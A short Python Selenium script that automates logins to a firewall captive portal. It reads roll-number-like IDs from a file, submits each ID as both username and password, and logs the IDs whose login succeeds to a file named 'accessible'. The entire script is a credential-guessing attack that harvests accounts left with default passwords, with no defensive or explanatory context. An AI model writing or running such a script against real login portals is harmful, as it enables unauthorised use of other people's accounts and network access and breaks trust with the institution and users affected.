from selenium import webdriver

browser=webdriver.Chrome("./chromedriver")



F=open("rollb151","r")
Fout=open("accessible","a")
count=1
i=1
line1=""
while count==1:
	
	browser.get("http://www.yahoo.com")
	if(browser.title!="Firewall Authentication"):
		Fout.write(line1)
		browser.execute_script("window.history.go(-1)")
		but=browser.find_element_by_link_text("logout")
		but.click()
		browser.get("http://www.yahoo.com")
	query1=browser.find_element_by_name("username")
	line1=F.readline()

	if(line1==''):
		break
	query1.send_keys(line1[0:9]+"\t"+line1[0:9]+"\n")
	i+=1

F.close()	
Fout.close()	
print line1
